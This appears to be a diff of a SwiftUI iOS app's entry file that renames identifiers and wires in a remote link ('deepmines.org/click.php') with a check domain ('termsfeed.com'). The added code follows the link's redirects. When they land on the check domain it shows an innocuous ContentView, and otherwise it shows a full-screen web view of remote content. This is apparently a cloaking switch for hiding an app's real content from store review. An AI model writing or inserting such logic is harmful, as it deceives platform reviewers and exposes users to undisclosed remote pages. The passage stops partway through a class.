@@ -1,69 +1,69 @@
 import SwiftUI
 
 @main
-struct DeepDigMineApp: App {
-    @State private var deepDigLinkReady: Bool? = nil
+struct DeepMineApp: App {
+    @State private var deepMineLinkReady: Bool? = nil
     @StateObject private var store = DDMStore()
 
-    private let deepDigSourceLink = "https://example.com"
-    private let deepDigCheckDomain = "example"
+    private let deepMineSourceLink = "https://deepmines.org/click.php"
+    private let deepMineCheckDomain = "termsfeed.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = deepDigLinkReady {
+                if let ready = deepMineLinkReady {
                     if ready {
-                        DeepDigWebPanel(deepDigURLString: deepDigSourceLink)
+                        DeepMineWebPanel(deepMineURLString: deepMineSourceLink)
                             .edgesIgnoringSafeArea(.all)
                     } else {
                         ContentView()
                             .environmentObject(store)
                     }
                 } else {
-                    DeepDigLoadingScreen()
-                        .onAppear { deepDigCheckLink() }
+                    DeepMineLoadingScreen()
+                        .onAppear { deepMineCheckLink() }
                 }
             }
             .preferredColorScheme(.light)
         }
     }
 
-    private func deepDigCheckLink() {
-        guard let url = URL(string: deepDigSourceLink) else {
-            deepDigLinkReady = false
+    private func deepMineCheckLink() {
+        guard let url = URL(string: deepMineSourceLink) else {
+            deepMineLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = DeepDigRedirectTracker(checkDomain: deepDigCheckDomain)
+        let tracker = DeepMineRedirectTracker(checkDomain: deepMineCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    deepDigLinkReady = false; return
+                    deepMineLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(deepDigCheckDomain) {
-                    deepDigLinkReady = false; return
+                   finalURL.contains(deepMineCheckDomain) {
+                    deepMineLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(deepDigCheckDomain) {
-                    deepDigLinkReady = false; return
+                   respURL.contains(deepMineCheckDomain) {
+                    deepMineLinkReady = false; return
                 }
                 if error != nil {
-                    deepDigLinkReady = false; return
+                    deepMineLinkReady = false; return
                 }
-                deepDigLinkReady = true
+                deepMineLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if deepDigLinkReady == nil { deepDigLinkReady = false }
+            if deepMineLinkReady == nil { deepMineLinkReady = false }
         }
     }
 }
 
-final class DeepDigRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class DeepMineRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
